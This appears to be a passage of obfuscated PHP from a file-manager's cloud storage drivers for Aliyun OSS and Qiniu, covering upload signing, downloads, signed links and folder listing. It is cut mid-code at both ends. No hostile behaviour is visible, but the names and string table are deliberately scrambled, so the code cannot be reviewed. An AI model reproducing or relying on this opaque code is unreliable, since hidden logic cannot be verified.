$_SERVER[íïàËŸë]; if (!($¤¤˜àâĞ = $this->getHost())) { return !1; } $šÁ—ğ½ƒ = $ÍÛÅÈÛ¸; $úÑ®¢€ı = date($öóŸ¶³–[1497], time() + $šÁ—ğ½ƒ); $÷„ìÚ• = new DateTime($úÑ®¢€ı); $ÍÊı¥ª = $÷„ìÚ•->format(DateTime::ISO8601); $åÂêô = strpos($ÍÊı¥ª, $öóŸ¶³–[372]); $ÍÊı¥ª = substr($ÍÊı¥ª, 0, $åÂêô) . $öóŸ¶³–[1498]; $œä±şñç = 1048576000 * 5; $ĞòµéÆ‡ = $this->pathFather($·ôÄß«á); $íÅ”ıï¬ = array($öóŸ¶³–[275] => $ÍÊı¥ª, $öóŸ¶³–[278] => array(array($öóŸ¶³–[1499], 0, $œä±şñç), array($öóŸ¶³–[281], $öóŸ¶³–[282], $ĞòµéÆ‡))); $ß•Óìº÷ = base64_encode(json_encode($íÅ”ıï¬)); $È‰‡²¾ = base64_encode(hash_hmac($öóŸ¶³–[263], $ß•Óìº÷, $this->secret, !0)); $­­ú¿ = array($öóŸ¶³–[293] => $ß•Óìº÷, $öóŸ¶³–[1500] => $this->accessKey, $öóŸ¶³–[285] => $öóŸ¶³–[274], $öóŸ¶³–[1501] => $È‰‡²¾, $öóŸ¶³–[208] => $¤¤˜àâĞ); $­­ú¿ = $this->trafficLimit($öóŸ¶³–[1495], $­­ú¿); return $­­ú¿; } public function multiUploadFormData($Ô·äÊÛĞ, $ ­ßÌˆ = 3600) { $ãÍ¥Şï« =& $_SERVER[íïàËŸë]; if (!($‘İµ´æ = $this->getHost())) { return !1; } $ ¬Éòü = $this->trafficLimit($ãÍ¥Şï«[1495]); $¥ŞÌÊÓÇ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ô·äÊÛĞ), $ ¬Éòü); return array($ãÍ¥Şï«[254] => $¥ŞÌÊÓÇ, $ãÍ¥Şï«[208] => $‘İµ´æ . $ãÍ¥Şï«[8] . $this->pathEncode($Ô·äÊÛĞ), $ãÍ¥Şï«[255] => gmdate($ãÍ¥Şï«[1502]), $ãÍ¥Şï«[97] => $Ô·äÊÛĞ); } public function multiUploadAuthData($Âä±Ñ††, $¡ğ“şó = array()) { $†ßóÕ‚Æ =& $_SERVER[íïàËŸë]; $–Ã¢»Ì = isset($¡ğ“şó[$†ßóÕ‚Æ[255]]) ? $¡ğ“şó[$†ßóÕ‚Æ[255]] : gmdate($†ßóÕ‚Æ[1502]); $Ûâ–Â¾³ = isset($¡ğ“şó[$†ßóÕ‚Æ[169]]) ? $¡ğ“şó[$†ßóÕ‚Æ[169]] : $†ßóÕ‚Æ[12]; $ãÈŞ¯• = $Âä±Ñ††; if (isset($¡ğ“şó[$†ßóÕ‚Æ[97]])) { $ãÈŞ¯• = $¡ğ“şó[$†ßóÕ‚Æ[97]]; unset($¡ğ“şó[$†ßóÕ‚Æ[97]]); } if (isset($¡ğ“şó[$†ßóÕ‚Æ[256]])) { $¡ğ“şó[$†ßóÕ‚Æ[255]] = $–Ã¢»Ì; return $this->listUploadParts($ãÈŞ¯•, $¡ğ“şó); } $¨÷ÂÂ’§ = array($†ßóÕ‚Æ[257], $†ßóÕ‚Æ[12], $†ßóÕ‚Æ[123], $–Ã¢»Ì, "\170\x2d\157\163\x73\x2d\x64\141\164\x65\72{$–Ã¢»Ì}", $†ßóÕ‚Æ[8] . $this->bucket . $†ßóÕ‚Æ[8] . $ãÈŞ¯• . $Ûâ–Â¾³); if (strpos($Ûâ–Â¾³, $†ßóÕ‚Æ[258]) === 0) { $¨÷ÂÂ’§[0] = $†ßóÕ‚Æ[259]; if ($Ë¬˜ÛÁ = $this->trafficLimit($†ßóÕ‚Æ[1495])) { $ãÈŞ¯• = $†ßóÕ‚Æ[1503]; array_splice($¨÷ÂÂ’§, 5, 0, $ãÈŞ¯• . $†ßóÕ‚Æ[4] . $Ë¬˜ÛÁ[$ãÈŞ¯•]); } } if (isset($¡ğ“şó[$†ßóÕ‚Æ[260]]) && $¡ğ“şó[$†ßóÕ‚Æ[260]] == $†ßóÕ‚Æ[261]) { $¨÷ÂÂ’§[0] = $†ßóÕ‚Æ[261]; } if (!empty($¡ğ“şó[$†ßóÕ‚Æ[1504]])) { $ˆµù· = array_merge(array($¨÷ÂÂ’§[4]), $¡ğ“şó[$†ßóÕ‚Æ[1504]]); sort($ˆµù·); $¨÷ÂÂ’§[4] = implode($†ßóÕ‚Æ[262], $ˆµù·); } $º¸‹¤–æ = implode($†ßóÕ‚Æ[262], $¨÷ÂÂ’§); $á¤¤À–Æ = base64_encode(hash_hmac($†ßóÕ‚Æ[263], $º¸‹¤–æ, $this->secret, !0)); $ã”Şİ¡È = $†ßóÕ‚Æ[1472] . $this->accessKey . $†ßóÕ‚Æ[4] . $á¤¤À–Æ; if (strpos($Ûâ–Â¾³, $†ßóÕ‚Æ[258]) === 0) { $ã”Şİ¡È = array($†ßóÕ‚Æ[265] => $ã”Şİ¡È, $†ßóÕ‚Æ[255] => $–Ã¢»Ì); if ($Ë¬˜ÛÁ) { $ã”Şİ¡È = array_merge($ã”Şİ¡È, $Ë¬˜ÛÁ); } } return $ã”Şİ¡È; } public function listUploadParts($âÇâ‹…, $äè‹–™û) { $‚Ùìà‘Ê =& $_SERVER[íïàËŸë]; $ÑÃßæĞ = parse_url_query($äè‹–™û[$‚Ùìà‘Ê[169]]); $•ÊÀÕç = $this->client->listParts($this->bucket, $this->pathEncode($âÇâ‹…), $ÑÃßæĞ[$‚Ùìà‘Ê[254]]); $°½«Êù = $•ÊÀÕç->getListPart(); $‘Ğ·Êïí = array(); foreach ($°½«Êù as $´ì¤·¶î) { $‘Ğ·Êïí[] = array($‚Ùìà‘Ê[308] => $´ì¤·¶î->getPartNumber(), $‚Ùìà‘Ê[309] => trim($´ì¤·¶î->getETag(), $‚Ùìà‘Ê[121])); } unset($äè‹–™û[$‚Ùìà‘Ê[256]], $äè‹–™û[$‚Ùìà‘Ê[260]]); $¿¯²•†ã = $this->multiUploadAuthData($âÇâ‹…, $äè‹–™û); if (empty($¿¯²•†ã)) { return !1; } return array($‚Ùìà‘Ê[265] => $¿¯²•†ã, $‚Ùìà‘Ê[255] => $äè‹–™û[$‚Ùìà‘Ê[255]], $‚Ùìà‘Ê[267] => $‘Ğ·Êïí); } public function download($¨¼¦Á›, $ü¥—¶À) { $»ªôÓ¹Ú =& $_SERVER[íïàËŸë]; if ($this->isFolder($¨¼¦Á›)) { return !1; } try { $¾Ï§êç… = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ü¥—¶À); $¾Ï§êç… = $this->trafficLimit($»ªôÓ¹Ú[112], $¾Ï§êç…); $this->client->getObject($this->bucket, $this->pathEncode($¨¼¦Á›), $¾Ï§êç…); } catch (OSS\Core\OssException $±„ÜÌÖ) { $this->writeLog(__FUNCTION__ . $»ªôÓ¹Ú[214] . $±„ÜÌÖ->getMessage()); return !1; } return $ü¥—¶À; } public function fileSubstr($éåíıÔ, $Ê¦û‰È = 0, $¤èö®Æ = false) { if ($Ê¦û‰È === -1) { $Òö•Ò›Ñ = array(); } else { if ($¤èö®Æ === !1) { $Œçéë³ó = $this->size($éåíıÔ); } else { $Œçéë³ó = $Ê¦û‰È + $¤èö®Æ - 1; } $Òö•Ò›Ñ = array(OSS\OssClient::OSS_RANGE => "{$Ê¦û‰È}\x2d{$Œçéë³ó}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($éåíıÔ), $Òö•Ò›Ñ); } catch (OSS\Core\OssException $¿«ı»å) { $this->writeLog(__FUNCTION__ . $_SERVER[íïàËŸë][214] . $¿«ı»å->getMessage()); think_exception($¿«ı»å->getMessage()); return !1; } } private function trafficLimit($ÈğÆ÷šŠ, $¹¡Í¯Ò‚ = array()) { $”•ñ×š =& $_SERVER[íïàËŸë]; if ($ÈğÆ÷šŠ == $”•ñ×š[1495] && $this->isUploadServer() || $ÈğÆ÷šŠ == $”•ñ×š[112] && $this->isFileOutServer()) { return $¹¡Í¯Ò‚; } $ÁÎ©âÒ = floatval($GLOBALS[$”•ñ×š[6]][$”•ñ×š[92]][$”•ñ×š[110]][$ÈğÆ÷šŠ]) * 1024 * 1024 * 8; if (!$ÁÎ©âÒ) { return $¹¡Í¯Ò‚; } $ÁÎ©âÒ = $ÁÎ©âÒ < 819200 ? 819200 : ($ÁÎ©âÒ > 838860800 ? 838860800 : $ÁÎ©âÒ); $¹¡Í¯Ò‚[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÁÎ©âÒ); return $¹¡Í¯Ò‚; } public function link($ã© Š¡ç, $«ˆ’© = array()) { $ñ”ï½éÖ =& $_SERVER[íïàËŸë]; if (!$this->exist($ã© Š¡ç) || $this->isFolder($ã© Š¡ç)) { return !1; } try { $«ˆ’© = $this->trafficLimit($ñ”ï½éÖ[112], $«ˆ’©); $åæÄÏäÛ = $this->client->signUrl($this->bucket, $this->pathEncode($ã© Š¡ç), 3600 * 12, $ñ”ï½éÖ[261], $«ˆ’©); return $this->getCdnLink($åæÄÏäÛ); } catch (OSS\Core\OssException $ûÚÎ¨¿Ì) { $this->writeLog(__FUNCTION__ . $ñ”ï½éÖ[214] . $ûÚÎ¨¿Ì->getMessage()); return !1; } } public function fileOut($•™Â—é, $‹¥À¶¡£ = false, $ñéá’Îø = false, $µÛ…¶‘ñ = '') { $¼¦êĞô¬ =& $_SERVER[íïàËŸë]; if ($this->isFileOutServer()) { return $this->fileOutServer($•™Â—é, $‹¥À¶¡£, $ñéá’Îø, $µÛ…¶‘ñ); } if (!$ñéá’Îø) { $ñéá’Îø = $this->pathThis($•™Â—é); } $ñéá’Îø = rawurlencode($ñéá’Îø); $¥šÏù¡Ô = get_file_mime(get_path_ext($ñéá’Îø)); if ($¥šÏù¡Ô == $¼¦êĞô¬[248]) { return parent::fileOut($•™Â—é, $‹¥À¶¡£, $ñéá’Îø, $µÛ…¶‘ñ); } $‹¥À¶¡£ = $‹¥À¶¡£ ? $¼¦êĞô¬[1505] : $¼¦êĞô¬[1506]; $ºš¥ò£Ó = array(OSS\OssClient::OSS_SUB_RESOURCE => $¼¦êĞô¬[1507] . rawurlencode("{$‹¥À¶¡£}\73\x66\151\x6c\x65\x6e\141\x6d\x65\x3d{$ñéá’Îø}")); $ºš¥ò£Ó[OSS\OssClient::OSS_SUB_RESOURCE] .= $¼¦êĞô¬[1508] . rawurlencode($¥šÏù¡Ô); $ ÈçÀ³ñ = $this->link($•™Â—é, $ºš¥ò£Ó); $this->fileOutLink($ ÈçÀ³ñ); } public function fileOutServer($½ÆÛ’œ, $Å°ÃüÀĞ = false, $ÊõÏ”ª¾ = false, $‰¡³Å = '') { parent::fileOut($½ÆÛ’œ, $Å°ÃüÀĞ, $ÊõÏ”ª¾, $‰¡³Å); } public function fileOutImage($¡ïÒ«Âî, $à¢èâŸ = 250) { if ($this->size($¡ïÒ«Âî) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¡ïÒ«Âî, $à¢èâŸ); } $³Æ¥ó·ò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[íïàËŸë][1469] . $à¢èâŸ); $¢ØßåüØ = $this->link($¡ïÒ«Âî, $³Æ¥ó·ò); $this->fileOutLink($¢ØßåüØ); } public function fileOutImageServer($¸ÛÊ¢×ì, $î»–Ã³ß = 250) { parent::fileOutImage($¸ÛÊ¢×ì, $î»–Ã³ß); } public function fileOutLink($àÂÙÇùı) { $šŸ±÷ã =& $_SERVER[íïàËŸë]; if (!$this->isCdnHost() && substr($àÂÙÇùı, 0, 7) == $šŸ±÷ã[313]) { $àÂÙÇùı = $šŸ±÷ã[314] . substr($àÂÙÇùı, 7); } header($šŸ±÷ã[175] . $àÂÙÇùı); die; } public function hashMd5($£ˆç¾ª, $ªÕëìàü = '') { $‘–Ş İŞ =& $_SERVER[íïàËŸë]; $‰Õãæ¼é = $this->_objectMeta($£ˆç¾ª); if (!$‰Õãæ¼é) { return $‘–Ş İŞ[12]; } if (!isset($‰Õãæ¼é[$‘–Ş İŞ[1489]]) && !empty($ªÕëìàü)) { $ú¯÷ÊÆš = $this->updateObjMeta($£ˆç¾ª, array($‘–Ş İŞ[1489] => $ªÕëìàü)); $‰Õãæ¼é[$‘–Ş İŞ[1489]] = $ú¯÷ÊÆš ? $ªÕëìàü : $‘–Ş İŞ[12]; } return isset($‰Õãæ¼é[$‘–Ş İŞ[1489]]) ? strtolower($‰Õãæ¼é[$‘–Ş İŞ[1489]]) : $‘–Ş İŞ[12]; } public function size($µ­¿¢‚Å) { $”˜×›¿ = $this->objectMeta($µ­¿¢‚Å); return $”˜×›¿ ? $”˜×›¿[$_SERVER[íïàËŸë][79]] : 0; } public function info($õÍÁªÅ) { if ($this->isFolder($õÍÁªÅ)) { return $this->folderInfo($õÍÁªÅ); } else { if ($this->isFile($õÍÁªÅ)) { return $this->fileInfo($õÍÁªÅ); } } return !1; } public function exist($†‚Ÿ÷çá) { return $this->isFile($†‚Ÿ÷çá) || $this->isFolder($†‚Ÿ÷çá); } public function isFile($Üè†ûùÔ) { return !$this->isFolder($Üè†ûùÔ) && $this->objectMeta($Üè†ûùÔ); } public function isFolder($”Òôñ ») { return $this->cacheMethod($_SERVER[íïàËŸë][179], $”Òôñ »); } protected function objectMeta($ˆş¡»š›) { return $this->cacheMethod($_SERVER[íïàËŸë][181], $ˆş¡»š›); } protected function _objectMeta($çŒºìœ§) { $Óğ®ëêØ =& $_SERVER[íïàËŸë]; try { $ğÇ£„Òê = $this->client->getObjectMeta($this->bucket, $this->pathEncode($çŒºìœ§)); } catch (OSS\Core\OssException $êÆŞçùï) { $this->writeLog(__FUNCTION__ . $Óğ®ëêØ[214] . $êÆŞçùï->getMessage()); $ğÇ£„Òê = !1; } if ($ğÇ£„Òê) { $ğÇ£„Òê[$Óğ®ëêØ[79]] = intval($ğÇ£„Òê[$Óğ®ëêØ[1487]]); } return $ğÇ£„Òê; } protected function _isFolder($–€»ƒàö) { $õñ×êô =& $_SERVER[íïàËŸë]; if ($–€»ƒàö == $õñ×êô[12] || $–€»ƒàö == $õñ×êô[8]) { return !0; } $ ÁÅ‚ß• = array($õñ×êô[1482] => $õñ×êô[8], $õñ×êô[1483] => rtrim($–€»ƒàö, $õñ×êô[8]) . $õñ×êô[8], $õñ×êô[1484] => 1, $õñ×êô[1485] => $õñ×êô[12]); $Ø…±‚Ò€ = $this->client->listObjects($this->bucket, $ ÁÅ‚ß•); if ($Ø…±‚Ò€->getObjectList() || $Ø…±‚Ò€->getPrefixList()) { return !0; } return !1; } public function writeLog($¬Øéî´‘ = '', $ÂËÑ‹©Ÿ = false) { $‚ğ—÷—Ş =& $_SERVER[íïàËŸë]; $­Õ˜¥Ğí = in_array(ACTION, array($‚ğ—÷—Ş[212], $‚ğ—÷—Ş[213])); if (!$­Õ˜¥Ğí && !GLOBAL_DEBUG) { return; } $ˆ¼ÁÛğ = 0; if (stripos($¬Øéî´‘, $‚ğ—÷—Ş[1509]) !== !1) { $ˆ¼ÁÛğ = 1; $ÜÎˆÓÂç = explode($‚ğ—÷—Ş[1510], $¬Øéî´‘); $¬Øéî´‘ = !empty($ÜÎˆÓÂç[1]) ? $ÜÎˆÓÂç[1] : $¬Øéî´‘; } else { if (stripos($¬Øéî´‘, $‚ğ—÷—Ş[1511])) { $ˆ¼ÁÛğ = 2; $ÜÎˆÓÂç = explode($‚ğ—÷—Ş[1511], $¬Øéî´‘); $ÜÎˆÓÂç = explode($‚ğ—÷—Ş[4], $ÜÎˆÓÂç[0]); $¬Øéî´‘ = !empty($ÜÎˆÓÂç[1]) ? $ÜÎˆÓÂç[1] : $¬Øéî´‘; } } if ($­Õ˜¥Ğí && I18n::getType() == $‚ğ—÷—Ş[1512]) { if ($ˆ¼ÁÛğ == 1) { $¬Øéî´‘ = str_replace($‚ğ—÷—Ş[1513], $‚ğ—÷—Ş[1514], $¬Øéî´‘); } else { if ($ˆ¼ÁÛğ == 2) { $ÜÎˆÓÂç = explode($‚ğ—÷—Ş[214], $ÜÎˆÓÂç[0]); $® ®š¦ = isset($ÜÎˆÓÂç[1]) ? $ÜÎˆÓÂç[1] : $‚ğ—÷—Ş[12]; $¾õä‰¨è = array($‚ğ—÷—Ş[1515] => $‚ğ—÷—Ş[1516], $‚ğ—÷—Ş[1517] => $‚ğ—÷—Ş[1518], $‚ğ—÷—Ş[1519] => $‚ğ—÷—Ş[1520], $‚ğ—÷—Ş[1521] => $‚ğ—÷—Ş[1522], $‚ğ—÷—Ş[1523] => $‚ğ—÷—Ş[1524], $‚ğ—÷—Ş[1525] => $‚ğ—÷—Ş[1526], $‚ğ—÷—Ş[1527] => $‚ğ—÷—Ş[1528], $‚ğ—÷—Ş[1529] => $‚ğ—÷—Ş[1530], $‚ğ—÷—Ş[1531] => $‚ğ—÷—Ş[1532], $‚ğ—÷—Ş[1533] => $‚ğ—÷—Ş[1534]); if (isset($¾õä‰¨è[$® ®š¦])) { $¬Øéî´‘ = $¾õä‰¨è[$® ®š¦]; } } } if (stripos($¬Øéî´‘, $‚ğ—÷—Ş[1535])) { $¬Øéî´‘ = $‚ğ—÷—Ş[1536]; } } if (!trim($¬Øéî´‘)) { return; } parent::writeLog(trim($¬Øéî´‘), $ÂËÑ‹©Ÿ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¹ƒÄıš˜) { parent::__construct(); require_once SDK_DIR . $_SERVER[íïàËŸë][1537]; $this->_init($¹ƒÄıš˜); } public function _init($–‹»¡ÒØ) { $ÓÍËüÂ =& $_SERVER[íïàËŸë]; $this->config = $–‹»¡ÒØ; foreach ($–‹»¡ÒØ as $¾Äèô± => $®Ï¾·äª) { if (isset($this->{$¾Äèô±})) { $this->{$¾Äèô±} = $®Ï¾·äª; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÓÍËüÂ[1538] . LNG($ÓÍËüÂ[1473])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Áç“¡Œä, $‘åˆàŞ = '', $ÃÑÒ“°© = REPEAT_RENAME) { if ($this->setContent($Áç“¡Œä, $‘åˆàŞ)) { return $this->getPathOuter($Áç“¡Œä); } return !1; } public function mkdir($•úŸÓîñ, $Äé¸İŒ¸ = REPEAT_SKIP) { $­ûÎÛÒÁ =& $_SERVER[íïàËŸë]; $‰”Çí÷Â = trim($•úŸÓîñ, $­ûÎÛÒÁ[8]); if ($this->_isFolder($‰”Çí÷Â)) { return $this->getPathOuter($‰”Çí÷Â); } $•úŸÓîñ = $‰”Çí÷Â . $­ûÎÛÒÁ[8]; $øÜ™…²ƒ = get_path_this($‰”Çí÷Â); $ˆİûÄê¢ = $•úŸÓîñ . $øÜ™…²ƒ; if (!$this->mkfile($ˆİûÄê¢)) { return !1; } if (!$this->moveFile($ˆİûÄê¢, $•úŸÓîñ)) { $this->delFile($ˆİûÄê¢); return !1; } return $this->getPathOuter($‰”Çí÷Â); } public function copyFile($ÍŠåçÊË, $©Šãñ‰…) { $ô˜ÚÉù‚ = $this->bucketManager->copy($this->bucket, $ÍŠåçÊË, $this->bucket, $©Šãñ‰…, !0); return $ô˜ÚÉù‚ ? !1 : $this->getPathOuter($©Šãñ‰…); } public function moveFile($ü¬¾¶ù, $íÆ’ô¾) { $ğ”¼œû• = $this->bucketManager->move($this->bucket, $ü¬¾¶ù, $this->bucket, $íÆ’ô¾, !0); return $ğ”¼œû• ? !1 : $this->getPathOuter($íÆ’ô¾); } public function delFile($Æ·´âô†) { if (!$this->exist($Æ·´âô†)) { return !0; } $ïº¥€Ğî = $this->bucketManager->delete($this->bucket, $Æ·´âô†); return $ïº¥€Ğî ? !1 : !0; } public function delFolder($œĞà¯ä£) { $İ¡¹¨¼ =& $_SERVER[íïàËŸë]; if (!$this->exist($œĞà¯ä£)) { return !0; } $this->listItemCache = !1; $­ÍŠùº = $this->fileList($œĞà¯ä£); $this->listItemCache = !0; $÷Û®ë·½ = trim($œĞà¯ä£, $İ¡¹¨¼[8]) . $İ¡¹¨¼[8]; if (!empty($œĞà¯ä£) && $œĞà¯ä£ !== $İ¡¹¨¼[228] && !in_array($÷Û®ë·½, $­ÍŠùº[$İ¡¹¨¼[85]])) { $­ÍŠùº[$İ¡¹¨¼[85]][] = $÷Û®ë·½; } $ôÀÌÊ”¯ = $this->delByBatch($­ÍŠùº[$İ¡¹¨¼[86]]); if (!$ôÀÌÊ”¯) { return !1; } $ôÀÌÊ”¯ = $this->delByBatch($­ÍŠùº[$İ¡¹¨¼[85]]); if (!$ôÀÌÊ”¯) { return !1; } return $this->delFile($÷Û®ë·½); } private function delByBatch($èÃÂ¨«ø) { foreach (array_chunk($èÃÂ¨«ø, 1000) as $œ†‚•Ñ) { $ÒÈòû” = $this->bucketManager->buildBatchDelete($this->bucket, $œ†‚•Ñ); list($ÄÀØê‘’, $êÔïÀÑã) = $this->bucketManager->batch($ÒÈòû”); if ($êÔïÀÑã) { return !1; } } return !0; } public function rename($ÌØĞ™éÂ, $ò ú«‚•) { return $this->renameObject($ÌØĞ™éÂ, $ò ú«‚•); } public function fileInfo($“àú¶­“, $ƒ¸Ò¿Öö = false, $Ùº¦Ê¤ = array()) { $±¯ÙÄ©¹ =& $_SERVER[íïàËŸë]; $ÙŸ®Ñ§Õ = array($±¯ÙÄ©¹[32] => $this->pathThis($“àú¶­“), $±¯ÙÄ©¹[87] => $this->getPathOuter($±¯ÙÄ©¹[8] . $“àú¶­“), $±¯ÙÄ©¹[33] => $±¯ÙÄ©¹[230], $±¯ÙÄ©¹[79] => isset($Ùº¦Ê¤[$±¯ÙÄ©¹[1539]]) ? $Ùº¦Ê¤[$±¯ÙÄ©¹[1539]] : 0, $±¯ÙÄ©¹[169] => $this->ext($“àú¶­“)); if ($ƒ¸Ò¿Öö) { return $ÙŸ®Ñ§Õ; } $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[231]] = $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[88]] = 0; $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[232]] = $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[233]] = !0; if (empty($Ùº¦Ê¤)) { $Ùº¦Ê¤ = $this->objectMeta($“àú¶­“); if (!$Ùº¦Ê¤) { return $ÙŸ®Ñ§Õ; } } if (isset($Ùº¦Ê¤[$±¯ÙÄ©¹[234]]) && $Ùº¦Ê¤[$±¯ÙÄ©¹[234]]) { $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[235]] = $Ùº¦Ê¤[$±¯ÙÄ©¹[234]]; } if (isset($Ùº¦Ê¤[$±¯ÙÄ©¹[245]]) && $Ùº¦Ê¤[$±¯ÙÄ©¹[245]]) { $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[235]] = $Ùº¦Ê¤[$±¯ÙÄ©¹[245]]; } if (isset($Ùº¦Ê¤[$±¯ÙÄ©¹[1540]])) { $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[88]] = substr($Ùº¦Ê¤[$±¯ÙÄ©¹[1540]] . $±¯ÙÄ©¹[12], 0, 10); } if (isset($Ùº¦Ê¤[$±¯ÙÄ©¹[1539]])) { $ÙŸ®Ñ§Õ[$±¯ÙÄ©¹[79]] = $Ùº¦Ê¤[$±¯ÙÄ©¹[1539]]; } return $ÙŸ®Ñ§Õ; } public function folderInfo($³İ×Â¢‰, $ãÔ™Æíò = false) { $˜é®ñ‰Á =& $_SERVER[íïàËŸë]; $¼²½‹ç³ = array($˜é®ñ‰Á[32] => $this->pathThis($³İ×Â¢‰), $˜é®ñ‰Á[87] => $this->getPathOuter($˜é®ñ‰Á[8] . $³İ×Â¢‰), $˜é®ñ‰Á[33] => $˜é®ñ‰Á[78]); if ($ãÔ™Æíò) { return $¼²½‹ç³; } $¼²½‹ç³[$˜é®ñ‰Á[231]] = $¼²½‹ç³[$˜é®ñ‰Á[88]] = 0; $¼²½‹ç³[$˜é®ñ‰Á[232]] = $¼²½‹ç³[$˜é®ñ‰Á[233]] = !0; $³İ×Â¢‰ = rtrim($³İ×Â¢‰, $˜é®ñ‰Á[8]) . $˜é®ñ‰Á[8]; $‹®¸â€à = $this->objectMeta($³İ×Â¢‰); if (isset($‹®¸â€à[$˜é®ñ‰Á[1540]])) { $¼²½‹ç³[$˜é®ñ‰Á[88]] = substr($‹®¸â€à[$˜é®ñ‰Á[1540]] . $˜é®ñ‰Á[12], 0, 10); } return $¼²½‹ç³; } public function listPath($ÚééÊ˜´, $Ç¦‘’‹² = false) { $Î­ûıË =& $_SERVER[íïàËŸë]; $Ùù°¯Ìë = $this->fileList($ÚééÊ˜´, $Î­ûıË[8], !0); foreach ($Ùù°¯Ìë[$Î­ûıË[85]] as $ôÈûË–È => $ïÕÕ¦û¦) { $Ùù°¯Ìë[$Î­ûıË[85]][$ôÈûË–È] = $this->folderInfo($ïÕÕ¦û¦, $Ç¦‘’‹²); } foreach ($Ùù°¯Ìë[$Î­ûıË[86]] as $ôÈûË–È => $ïÕÕ¦û¦) { $Ùù°¯Ìë[$Î­ûıË[86]][$ôÈûË–È] = $this->fileInfo($ïÕÕ¦û¦[$Î­ûıË[97]], $Ç¦‘’‹², $ïÕÕ¦û¦); } return $Ùù°¯Ìë; } public function has($Û·±î, $Ì²´¦† = false, $Ñ¿å“ Ó = true) { $äûŞàœÑ =& $_SERVER[íïàËŸë]; $Û·±î = trim($Û·±î, $äûŞàœÑ[8]); $ì½öš¥† = empty($Û·±î) && $Û·±î !== $äûŞàœÑ[228] ? $äûŞàœÑ[12] : $Û·±î . $äûŞàœÑ[8]; $Üƒ½›ˆğ = $äûŞàœÑ[12]; $¿æÆ‹Á£ = 500; $±úÏîº‚ = $äûŞàœÑ[8]; $·ä“ğĞ = $ºÁÅµÓ = 0; while (!0) { check_abort(); list($§»ğü»Ş, $şìŒÃò¥) = $this->bucketManager->listFiles($this->bucket, $ì½öš¥†, $Üƒ½›ˆğ, $¿æÆ‹Á£, $±úÏîº‚); if ($şìŒÃò¥) { break; } $Üƒ½›ˆğ = array_key_exists($äûŞàœÑ[1485], $§»ğü»Ş) ? $Üƒ½›ˆğ = $§»ğü»Ş[$äûŞàœÑ[1541]] : $äûŞàœÑ[12]; if ($Ì²´¦†) { if (!empty($§»ğü»Ş[$äûŞàœÑ[1542]])) { $·ä“ğĞ += count($§»ğü»Ş[$äûŞàœÑ[1542]]); } if (!empty($§»ğü»Ş[$äûŞàœÑ[1543]])) { $ºÁÅµÓ += count($§»ğü»Ş[$äûŞàœÑ[1543]]); } if ($Üƒ½›ˆğ === $äûŞàœÑ[12]) { break; } continue; } if ($Ñ¿å“ Ó) { if (!empty($§»ğü»Ş[$äûŞàœÑ[1542]])) { return !0; } } else { if (!empty($§»ğü»Ş[$äûŞàœÑ[1543]])) { return !0; } } if ($Üƒ½›ˆğ === $äûŞàœÑ[12]) { break; } } if ($Ì²´¦†) { return array($äûŞàœÑ[239] => $·ä“ğĞ, $äûŞàœÑ[240] => $ºÁÅµÓ); } return !1; } public function listAll($‹Êôùóµ) { $¹ïôŞÈë =& $_SERVER[íïàËŸë]; $½Š­ÊÇ‡ = $this->fileList($‹Êôùóµ, $¹ïôŞÈë[12], !0); $ü¨Æé± = array_to_keyvalue($½Š­ÊÇ‡[$¹ïôŞÈë[86]], $¹ïôŞÈë[32]); foreach ($½Š­ÊÇ‡[$¹ïôŞÈë[85]] as $Õ¬ö¨Ó) { if (is_string($Õ¬ö¨Ó)) { $ü¨Æé±[$Õ¬ö¨Ó] = array($¹ïôŞÈë[79] => 0); } } return $this->listAllFiles($‹Êôùóµ, $ü¨Æé±); } private function fileList($ÙÊ¬Öì›, $©şü¬ãœ = '', $–€ÒşÈ» = 0) { $±æ¬Ò‹² =& $_SERVER[íïàËŸë]; $ÙÊ¬Öì› = trim($ÙÊ¬Öì›, $±æ¬Ò‹²[8]); $Ïşñ¾éĞ = empty($ÙÊ¬Öì›) && $ÙÊ¬Öì› !== $±æ¬Ò‹²[228] ? $±æ¬Ò‹²[12] : $ÙÊ¬Öì› . $±æ¬Ò‹²[8]; $ŸÔ¾Ãü¬ = $±æ¬Ò‹²[12]; $åÖîğ‹ä = 1000; $¼ª¯«Ó = $Ï©¯İƒ = array(); while (!0) { check_abort(); list($«ò–åÃ, $Ö·ğšâ®) = $this->bucketManager->listFiles($this->bucket, $Ïşñ¾éĞ, $ŸÔ¾Ãü¬, $åÖîğ‹ä, $©şü¬ãœ); if ($Ö·ğšâ®) { break; } $ŸÔ¾Ãü¬ = array_key_exists($±æ¬Ò‹²[1485], $«ò–åÃ) ? $ŸÔ¾Ãü¬ = $«ò–åÃ[$±æ¬Ò‹²[1541]] : $±æ¬Ò‹²[12]; $‚Àı²¶× = isset($«ò–åÃ[$±æ¬Ò‹²[1542]]) ? $«ò–åÃ[$±æ¬Ò‹²[1542]] : array(); $Ÿ‡ë’…ë = isset($«ò–åÃ[$±æ¬Ò‹²[1543]]) ? $«ò–åÃ[$±æ¬Ò‹²[1543]] : array(); foreach ($‚Àı²¶× as $Ó‰À·á™) { if ($Ó‰À·á™[$±æ¬Ò‹²[97]] == $Ïşñ¾éĞ) { continue; } $—éçâ = $Ó‰À·á™[$±æ¬Ò‹²[97]]; 